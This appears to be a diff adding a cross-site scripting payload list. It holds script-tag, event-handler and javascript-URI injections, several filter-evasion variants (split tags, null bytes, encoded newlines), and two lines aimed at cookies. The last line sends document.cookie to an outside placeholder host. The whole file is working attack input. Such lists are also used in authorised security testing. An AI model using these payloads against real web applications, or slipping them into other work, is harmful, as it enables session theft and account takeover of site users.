@@ -1,0 +1,27 @@
+<script>alert(1)</script>
+">>>>>><marquee>RXSS</marquee></head><abc></script><script>alert(document.cookie)</script><meta
+<script>alert('XSS')</script>
+<svg onload=alert(1)>
+<img src=x onerror=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+<a href="#" onclick="alert(1)">Click</a>
+<body onload=alert(1)>
+<div onmouseover="alert(1)">hover me</div>
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+<a href="javascript:alert(1)">Click</a>
+<iframe src="javascript:alert(1)"></iframe>
+<scr<script>ipt>alert(1)</scr<script>ipt>
+<scr%00ipt>alert(1)</scr%00ipt>
+<svg%0Aonload=alert(1)>
+<input value="><script>alert(1)</script>">
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+";alert(1);// 
+');alert(1);//
+</script><script>alert(1)</script>
+<math><mi//xlink:href="javascript:alert(1)">
+<template><div onmouseover=alert(1)></template>
+#"><img src=x onerror=alert(1)>
+#<svg onload=alert(1)>
+<script>fetch('//yourdomain.com/cookie?c='+document.cookie)</script>
